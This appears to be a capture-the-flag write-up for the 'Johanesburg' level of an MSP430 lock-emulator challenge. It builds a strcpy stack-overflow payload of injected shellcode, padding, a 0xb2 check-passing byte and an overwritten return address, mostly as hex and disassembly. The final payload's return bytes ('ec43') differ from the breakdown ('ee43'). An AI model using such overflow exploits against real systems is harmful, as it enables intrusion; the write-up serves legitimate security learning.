---
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: false
  anchors:
    visible: true
---

# Johanesburg

In this challenge, we continue building on the foundational skills introduced in `Whitehorse` and `Montevideo`. Again, we need to add another step to our solution. In addition to the features in our last payload, we extend the payload by including a byte to meet later conditionals, which will enable us to reach the right code branch to cause our `return address` to be read.

## Analyzing `main` & `login`

`main` takes us directly into `login`. When the call is made, the return address `0x443c` is pushed onto the stack at `0x43fe`.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2FuJz9B3ksHyP27bwjd7hp%2Fjohanesburg-01.png?alt=media)

The `login` function calls `getsn`, allowing up to 63 characters of password input to be written to `0x2400`.

![Note: this is the 17th byte when counting from zero.](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2FhQVHak2KyUiGg0ukrtTu%2Fjohanesburg-02.png?alt=media)

Just like the previous level, the password is eventually written to the stack using `strcpy`. And we are able to overwrite the login return address located at `0x43fe`.

However, different from before, there is an instruction at `0x4578` which compares a byte of the password input with `0xb2`. If the bytes match, the login function jumps over the branch instruction `br` located at `0x4588`. If the bytes don't match, the `jz` is not taken, and the next three instructions are executed.

The `br` branch instruction performs an unconditional jump by loading a new address directly into the program counter. In this case, it loads `0x443c`, which is the `__stop_progExec__` routine.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2Fe799Sd1wxKtPpi4cIOQQ%2Fjohanesburg-03.png?alt=media)

This routine causes the program to stop.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2Fs0Mpeh1vuW2Ys98Ewa15%2Fjohanesburg-04.png?alt=media)

So we know that we need to make sure the bytes match so we can reach the `ret` at the end of `login` which is what causes our payload to be executed.

### strcpy & Building a Byte Sanitized Payload

Refer back to the previous write up, [`Montevideo`](montevideo.md#strcpy), for a detailed explanation of `strcpy` and `Building a Sanitized Payload`.

## Building an Updated Payload

To refresh ourselves with where we left off, we had the following payload built:

```
3f40 ff01 3f80 8001 0f12 b012 4c45 1111 ee43
 
3f40 ff01 3f80 8001 0f12 b012 4c45 = opcodes
 
======================================================================
3f40 ff01       mov #0x01ff, r15
3f80 8001       sub #0x0180, r15        will result in -> r15 = 0x007f
0f12            push r15
b012 4c45       call <INT> #0x454c
====================================================================== 

1111 = padding
 
ee43 = return address
```

Because of the `cmp` instruction in `login` at `0x4578`, we must make sure `0x11(sp)` is equal to `0xb2`. We can confirm with some dynamic analysis, the stack pointer is pointed at our password input written to the stack with `strcpy` at the time of the `cmp`.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2FvlwYFNx1xsuG88zTrICT%2Fjohanesburg-05.png?alt=media)

So really, this `cmp` can be evaluated as: offset `0x11` or the `17th` decimal byte of our payload must be `0xb2` to reach the necessary code branch where we return from `login`.

### Adjust Location of ret

`0x43fe` is the location where the new return address will need to be inserted. To make things easier we will use the first byte of where our payload is copied, `0x43ec`, as our return address.

We have to be inclusive of the final byte, so we can calculate the difference between those two locations as 20 bytes. `0x4400` (inclusive of `0x43fe`) - `0x43ec` = `0x14`

So we know our payload will need to adjust the padding to properly align the return address

<pre><code>========================== Original Payload =============================

3f40    ff01   3f80   8001   0f12   b012   4c45   1111   ee43   ----
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe

========================== Adjusted Payload v1 =============================

3f40    ff01   3f80   8001   0f12   b012   4c45   1111   <a data-footnote-ref href="#user-content-fn-1">1111</a>   <a data-footnote-ref href="#user-content-fn-2">ee43</a>
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe


New padding = 1111 1111
</code></pre>

### Adjust Location of INT call

In the previous payload we call `0x454c` to execute the `INT` function. If we check for `INT`, the function is located in a different location in the `Johanesburg` level.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2F919Lq9yxRI0EgBQF9Ay2%2Fjohanesburg-06.png?alt=media)

Since we used absolute addressing in the `call` before, we just need to adjust the address used.

<pre><code>========================== Adjusted Payload v1 =============================

3f40    ff01   3f80   8001   0f12   b012   <a data-footnote-ref href="#user-content-fn-3">4c45</a>   1111   1111   ee43
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe

========================== Adjusted Payload v2 =============================

3f40    ff01   3f80   8001   0f12   b012   <a data-footnote-ref href="#user-content-fn-4">9445</a>   1111   1111   ee43
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe

</code></pre>

### Insert Conditional Passing Byte

Finally, we can add our `0xb2` in the 17th byte slot of our payload to pass the `cmp` `jz` sequence which would end the program. Remember to account for the endianness!

<pre><code>========================== Adjusted Payload v2 =============================

3f40    ff01   3f80   8001   0f12   b012   9445   1111   <a data-footnote-ref href="#user-content-fn-5">1111</a>   ee43
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe

========================== Adjusted Payload v3 =============================

3f40    ff01   3f80   8001   0f12   b012   9445   1111   <a data-footnote-ref href="#user-content-fn-6">11b2</a>   ee43
 
0x43ec 0x43ee 0x43f0 0x43f2 0x43f4 0x43f6 0x43f8 0x43fa 0x43fc 0x43fe

0  1    2  3   4  5   6  7   8  9   10 11  12 13  14 15  16 17  18 19

</code></pre>

### Final Payload

```
3f40 ff01 3f80 8001 0f12 b012 9445 = opcodes
 
======================================================================
3f40 ff01       mov #0x01ff, r15
3f80 8001       sub #0x0180, r15        will result in -> r15 = 0x007f
0f12            push r15
b012 9445       call <INT> #0x4594
====================================================================== 

1111 11 = padding

b2 = byte conditional
 
ee43 = return address

Final Result:

3f40 ff01 3f80 8001 0f12 b012 9445 1111 11b2 ec43
```

### Solution

Testing our payload...

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2FWByN7SfYTgcvJgsG03Uz%2Fjohanesburg-07.png?alt=media)

The payload successfully unlocks the door.

![](https://4066390816-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fnfvg4HLLwZ8TXAijFDY1%2Fuploads%2FuXTqqdAgfcWeLD77DACp%2Fjohanesburg-08.png?alt=media)

### Security Takeaway

Relying on arbitrary, easily visible byte comparisons such as checking if a specific byte in user input matches a hard-coded value to determine execution paths, does not constitute genuine security. When an attacker already controls the input buffer (as seen with the `strcpy` vulnerability), they can trivially embed the required bytes into their payload to bypass these validation checks and force the program down a vulnerable execution branch.

[^1]: insert new padding

[^2]: return address

[^3]: old INT address

[^4]: updated INT address

[^5]: original padding

[^6]: added custom byte
